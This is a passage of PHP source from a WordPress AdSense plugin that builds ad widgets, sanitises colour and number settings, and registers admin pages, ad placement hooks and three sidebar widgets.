			if ( !$options['ad-active-widget-search'] ) {
				if ( ($this -> check_page() && $cerAdNum < $options['ad-number']) || $options['ohter-option-sidebar'] ) {
					$cerAdNum++;
					extract($args);
					$options = $this -> get_current_options();
					
					$html .= $before_widget;
					// title
					if ( !$options['ad-title-hide-widget-search'] ) {
						$html .= $before_title;
						switch( $options['ad-custom-title-widget-search'] ) {
							case '1':
								$html .= '<img src="' . $this -> pluginUrl . 'templates/images/Logo_25wht.gif' .'" alt="google log" /> ';
								break;
							
							case '2':
								$html .= '<img src="' . $this -> pluginUrl . 'templates/images/Logo_25blk.gif' .'" alt="google log" /> ';
								break;
							
							case '3':
								$html .= strip_tags(trim($options['ad-title-widget-search']));
								break;
						}
						$html .= $after_title;
					}
					// ads
					$html .= '<div class="cerAdsense cerAdsenseAds">';
					$html .= $this -> gen_google_ads('widget-search');
					$html .= '</div>';
					
					$html .= $after_widget;
				}
			}
			
			echo $html;
		}
		
		/**
		 * 输出管理选项的列表
		 * 
		 * @return    string    html
		 */
		function widget_ad_control() {
			$html = '<p>Please use the Adsense for Wordpress options to set your settings:</p>';
			$html .= '<a href="./options-general.php?page=adsense-for-wordpress.php">Adsense for Wordpress</a>';
			echo $html;
		}
		
	
		
		/**
		 * 输入值检查
		 * 
		 * @param    string    string for check
		 * @param    string    type, word or color
		 * @return   string    string was filter
		 */
		function check_value($value, $type = 'word') {
			if ( $type == 'color' ) {
				$dict = 'abcdef0123456789#';
			} elseif ( $type == 'color-list' ) {
				$dict = 'abcdef0123456789#;';
			} else {
				$dict = '0123456789';
			}
			
			$length = strlen($value);
			$string = '';
			for ( $i = 0; $i < $length; $i++ ) {
				if ( stripos($dict, ($value[$i])) !== false ) {
					$string .= $value[$i];
				}
			}
			
			// check the color
			if ( $type == 'color' || $type == 'color-list' ) {
				$colorArr = explode(';', $string);
				unset($colorArr[5]);
				
				foreach ( $colorArr as &$cell ) {
					$color = '';
					if ( (strlen($cell) == 7) && (strpos($cell, '#') === 0) && (strrpos($cell, '#') === 0) ) {
						$color = $cell;
					}
					if ( (strlen($cell) == 4) && (strpos($cell, '#') === 0) && (strrpos($cell, '#') === 0) ) {
						$color = '#' . $cell[1] . $cell[1] . $cell[2] . $cell[2] . $cell[3] . $cell[3] ;
					}
					$cell = $color;
				}
				$string = join(';', $colorArr);
			}
			
			return $string;
		}
		
	}	// End Class cerAdsense

}

if ( class_exists('cerAdsense') ) {
	
	$cerAd = new cerAdsense();
	$options = $cerAd -> get_current_options();
	$cerAdNum = 0;
	
	/**
	 * 入口方法: 创建插件在后台的链接入口
	 */
	if ( !function_exists('cerGenAdminPage') ) {
		function cerGenAdminPage() {
			global $cerAd;
			if ( function_exists('add_options_page') ) {
				add_options_page('WP Adsense', 'WP Adsense', 9, basename(__FILE__), array(&$cerAd, 'genAdminPage'));
			}
		}
	}
	add_action('admin_menu', 'cerGenAdminPage');
	
	/**
	 * 在安装插件的位置添加settings链接可直接转到wp adsense管理页面
	 */
	function cerGenPluginLinks($links, $file) {
		global $cerAd;
		if ( $file == $cerAd -> pluginName . '/' . $cerAd -> pluginName . '.php' ) {
			$link = '<a href="options-general.php?page=' . $cerAd -> pluginName . '.php">Settings</a>';
			array_unshift( $links, $link );
		}
    return $links;
  }
  add_filter('plugin_action_links', 'cerGenPluginLinks', 8, 2);
	
	/**
	 * 添加广告 - 头部及底部
	 */
	if ( $options['ad-position-top']     ==  1 ) add_action('wp_head',      array($cerAd, 'lead_ads_top'));
	if ( $options['ad-position-top']     ==  2 ) add_action('loop_start',   array($cerAd, 'lead_ads_top'));
	if ( $options['ad-position-bottom']  ==  1 ) add_action('loop_end',     array($cerAd, 'lead_ads_bottom'));
	if ( $options['ad-position-bottom']  ==  2 ) add_action('get_footer',   array($cerAd, 'lead_ads_bottom'));
	if ( $options['ad-position-bottom']  ==  3 ) add_action('wp_footer',    array($cerAd, 'lead_ads_bottom'));
	
	/**
	 * 添加广告 - 内容部分
	 */
	add_filter('the_content', array($cerAd, 'rebuild_content'));
	
	/**
	 * 在小工具添加Google Text栏目
	 */
	class cerAdsenseText extends WP_Widget {
		function cerAdsenseText() {
			$widget_ops = array(
      	'classname' => 'cerAdsenseText',
      	'description' => 'Show a Google AdSense block in your sidebar as a widget'
      );
			$this->WP_Widget('cerAdsenseText', 'WP Adsense : Google Text', $widget_ops);
		}
   	function widget($args, $instance) {
      global $cerAd;
      $cerAd -> widget_text($args);
    }
		/*function update($new_instance, $old_instance) {
      // processes widget options to be saved
      return $new_instance ;
		}*/
		function form($instance) {
      global $cerAd;
      $cerAd -> widget_ad_control();
    }
	}
	add_action('widgets_init', create_function('', 'return register_widget("cerAdsenseText");'));
	
	/**
	 * 在小工具添加Google Link栏目
	 */
	class cerAdsenseLink extends WP_Widget {
	  function cerAdsenseLink() {
			$widget_ops = array(
				'classname' => 'cerAdsenseLink',
				'description' => 'Show a Google Links Unit in your sidebar as a widget'
			);
			$this->WP_Widget('cerAdsenseLink', 'WP Adsense : Google Link Unit', $widget_ops);
	  }
   	function widget($args, $instance) {
      global $cerAd;
      $cerAd -> widget_link($args);
    }
		function form($instance) {
			global $cerAd;
      $cerAd -> widget_ad_control();
		}
	}
	add_action('widgets_init', create_function('', 'return register_widget("cerAdsenseLink");'));
	
	/**
	 * 在小工具添加Google Search栏目
	 */
	class cerAdsenseSearch extends WP_Widget {
	  function cerAdsenseSearch() {
			$widget_ops = array(
				'classname' => 'cerAdsenseSearch',
				'description' => 'Show a Google Search Box in your sidebar as a widget'
			);
			$this->WP_Widget('cerAdsenseSearch', 'WP Adsense : Google Search', $widget_ops);
	  }
   	function widget($args, $instance) {
      global $cerAd;
      $cerAd -> widget_search($args);
    }
		function form($instance) {
			global $cerAd;
      $cerAd -> widget_ad_control();
		}
	}
	add_action('widgets_init', create_function('', 'return register_widget("cerAdsenseSearch");'));
	
}

// function for test
if ( !function_exists('dump') ) {
	function dump($obj) {
		echo '<pre>';
		print_r($obj);
		echo '</pre>';
	}
}

?>